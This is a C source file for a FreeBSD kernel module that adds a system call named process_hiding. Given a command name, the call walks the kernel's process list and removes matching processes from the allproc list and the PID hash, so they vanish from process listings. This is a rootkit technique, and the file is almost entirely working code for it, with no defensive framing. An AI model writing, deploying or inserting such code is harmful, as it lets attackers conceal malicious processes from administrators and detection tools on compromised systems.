#include <sys/param.h>
#include <sys/types.h>
#include <sys/systm.h>
#include <sys/kernel.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <bsm/audit_kevents.h>
#include <sys/sysent.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/queue.h>

struct process_hiding_args {
	char *p_comm; /* process command */
};

static int process_hiding(struct thread *td, void *syscall_args) {
	struct process_hiding_args *uap;
	uap = (struct process_hiding_args *) syscall_args;

	/* String is in userspace!! */
	uprintf("uap->p_comm at %p\n", uap->p_comm);
	char target[MAXCOMLEN - 1];
	copyinstr(uap->p_comm, target, MAXCOMLEN - 1, NULL);
	uprintf("target at %p holding '%s'\n", target, target);

	struct proc *p;
	sx_xlock(&allproc_lock);

	/*
		LIST_HEAD(proclist, proc);
		LIST_ENTRY(proc) p_list;
	 	struct proc *p;
		struct proclist allproc;
	*/
	// LIST_FOREACH(p, &allproc, p_list) {
	FOREACH_PROC_IN_SYSTEM(p) {
		PROC_LOCK(p);

		/* Do not hide a process that is already ending */
		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
			PROC_UNLOCK(p);
			continue;
		}

		/* Is this the target process? */
		if (strncmp(p->p_comm, target, MAXCOMLEN) == 0) {
			uprintf("hiding process '%s' at %p\n", p->p_comm, p);
			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);
		}

		PROC_UNLOCK(p);
	}

	sx_xunlock(&allproc_lock);

	return 0;
}

static struct sysent syscall_sysent = {
	.sy_narg = 1,
	.sy_call = process_hiding
};

static int syscall_no = NO_SYSCALL;

static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch(cmd) {
		case MOD_LOAD:
			printf("Process Hiding loaded as syscall #%d.\n", syscall_no);
			break;
		case MOD_UNLOAD:
			printf("Syscall #%d unloaded.\n", syscall_no);
			break;
		default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}

SYSCALL_MODULE(process_hiding, &syscall_no, &syscall_sysent, load, NULL);
